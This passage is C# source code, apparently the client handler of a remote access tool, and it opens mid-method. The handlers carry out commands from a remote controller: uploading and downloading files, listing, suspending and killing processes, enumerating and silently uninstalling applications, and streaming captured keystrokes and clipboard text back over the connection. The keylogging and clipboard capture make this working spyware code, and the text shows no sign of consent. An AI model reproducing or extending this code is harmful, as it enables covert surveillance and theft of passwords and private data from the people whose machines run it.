            client.send(toSend.toArray());
        }

        private static void handleUploadFileEnd(Connection client, Packet p)
        {
            lock (_uploads)
            {
                int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

                _uploads[id].Close();
                _uploads.Remove(id);
            }
        }

        private static void handleDownloadFileBegin(Connection client, Packet p)
        {
            int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));

            lock (_downloads)
            {
                byte[] data = File.ReadAllBytes(Encoding.Unicode.GetString(p.Data[1]));
                _downloads.Add(id, new Pair<byte[], int>() { First = data, Second = 0 });
            }
        }

        private static void handleDownloadFilePart(Connection client, Packet p)
        {
            int id = Convert.ToInt32(Encoding.Unicode.GetString(p.Data[0]));
            Pair<byte[], int> d = _downloads[id];

            byte[] buffer;
            int diff = d.First.Length - d.Second;

            if (diff > 1024)
                buffer = new byte[1024];
            else
                buffer = new byte[diff];

            Buffer.BlockCopy(d.First, d.Second, buffer, 0, buffer.Length);
            d.Second += buffer.Length;

            Packet toSend = new Packet(Command.DownloadFilePart);
            toSend.addData(id.ToString());
            toSend.addData(buffer);

            client.send(toSend.toArray());

            if (d.Second >= d.First.Length)
                _downloads.Remove(id);
        }

        private static void handleGetProcessList(Connection client)
        {
            Packet toSend = new Packet(Command.GetProcessList);

            foreach (Process p in Process.GetProcesses())
            {
                toSend.addData(p.ProcessName);
                toSend.addData(p.Id.ToString());
            }

            client.send(toSend.toArray());
        }

        private static void handleSuspendProcess(Packet p)
        {
            foreach (byte[] data in p.Data)
            {
                int id = Convert.ToInt32(Encoding.Unicode.GetString(data));

                Process proc = Process.GetProcessById(id);

                foreach (ProcessThread pt in proc.Threads)
                {
                    IntPtr handle = OpenThread(2, false, (uint)pt.Id);

                    if (handle == IntPtr.Zero)
                        continue;

                    SuspendThread(handle);
                    CloseHandle(handle);
                }
            }
        }

        private static void handleResumeProcess(Packet p)
        {
            foreach (byte[] data in p.Data)
            {
                int id = Convert.ToInt32(Encoding.Unicode.GetString(data));

                Process proc = Process.GetProcessById(id);

                foreach (ProcessThread pt in proc.Threads)
                {
                    IntPtr handle = OpenThread(2, false, (uint)pt.Id);

                    if (handle == IntPtr.Zero)
                        continue;

                    ResumeThread(handle);
                    CloseHandle(handle);
                }
            }
        }

        private static void handleKillProcess(Packet p)
        {
            foreach (byte[] data in p.Data)
            {
                int id = Convert.ToInt32(Encoding.Unicode.GetString(data));

                Process.GetProcessById(id).Kill();
            }
        }

        private static void handleKeystrokeStart()
        {
            _sendKey = true;
        }

        private static void handleKeystrokeStop()
        {
            _sendKey = false;
        }

        private static void handleClipboardStart()
        {
            _sendClip = true;
        }

        private static void handleClipboardStop()
        {
            _sendClip = false;
        }

        private static void _kboard_KeyDown(string key)
        {
            if (_sendKey)
            {
                Packet toSend = new Packet(Command.KeystrokeInfo);
                toSend.addData(key);

                _client.send(toSend.toArray());
            }
        }

        private static void _cboard_ChangedEvent()
        {
            if (_sendClip)
            {
                Packet toSend = new Packet(Command.ClipboardInfo);
                toSend.addData(System.Windows.Forms.Clipboard.GetText());

                _client.send(toSend.toArray());
            }
        }

        private static void handleGetApplications(Connection client)
        {
            _applications.Clear();

            string uninstall = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";

            try
            {
                using (RegistryKey r = Registry.LocalMachine.OpenSubKey(uninstall))
                {
                    foreach (string subkeyName in r.GetSubKeyNames())
                    {
                        using (RegistryKey subkey = r.OpenSubKey(subkeyName))
                        {
                            try
                            {
                                string display = subkey.GetValue("DisplayName").ToString();
                                bool quiet = subkey.GetValueNames().Contains("QuietUninstallString");
                                string uninstallShell = subkey.GetValue("UninstallString").ToString();

                                _applications.Add(display, new Tuple<bool, string>(quiet, uninstallShell));
                            }
                            catch
                            { }
                        }
                    }
                }
            }
            catch
            { }

            try
            {
                using (RegistryKey r = Registry.CurrentUser.OpenSubKey(uninstall))
                {
                    foreach (string subkeyName in r.GetSubKeyNames())
                    {
                        using (RegistryKey subkey = r.OpenSubKey(subkeyName))
                        {
                            try
                            {
                                string display = subkey.GetValue("DisplayName").ToString();
                                bool quiet = subkey.GetValueNames().Contains("QuietUninstallString");
                                string uninstallShell = string.Empty;

                                if (quiet)
                                    uninstallShell = subkey.GetValue("QuietUninstallString").ToString();
                                else
                                    uninstallShell = subkey.GetValue("UninstallString").ToString();

                                _applications.Add(display, new Tuple<bool, string>(quiet, uninstallShell));
                            }
                            catch
                            { }
                        }
                    }
                }
            }
            catch
            { }

            Packet toSend = new Packet(Command.GetApplications);

            foreach (string name in _applications.Keys)
            {
                toSend.addData(name);
                toSend.addData(_applications[name].Item1 ? "1" : "0");
                toSend.addData(_applications[name].Item2);
            }

            client.send(toSend.toArray());
        }

        private static void handleUninstallApplication(Connection client, Packet p)
        {
            foreach (byte[] data in p.Data)
            {
                string name = Encoding.Unicode.GetString(data);

                if (_applications.ContainsKey(name))
                    Process.Start(_applications[name].Item2);
            }
        }
    }
}
